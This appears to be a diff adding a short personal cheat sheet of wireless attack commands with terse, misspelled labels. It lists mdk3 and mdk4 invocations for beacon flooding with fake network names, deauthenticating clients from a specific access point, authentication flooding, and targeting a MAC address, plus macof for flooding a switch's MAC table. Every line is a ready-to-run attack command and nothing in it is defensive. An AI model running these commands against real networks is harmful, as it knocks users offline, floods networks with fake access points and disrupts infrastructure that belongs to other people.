@@ -1,0 +1,28 @@
+creat list of file of different name
+mon enable
+
+mdk3 wlan0 b -c 1 -f /home/$USER/Desktop/
+
+fake wifi make
+
+mdk4 wlan0 b -f /home/death/Desktop/wifi-fake
+
+direct without file
+mdk4 wlan0 b
+
+particular bssid 
+mdk4 wlan0 b -n (bssid)
+
+deauth
+mdk4 wlan0 d -B 64:FB:92:8C:14:78 -c 1 -s 50 (speed)
+
+deauth all clint 
+mdk4 wlan0 a 
+ 
+
+fake arp table attack
+mdk4 wlan0 a -a 64:FB:92:8C:14:78
+
+
+
+macof -1 eth0
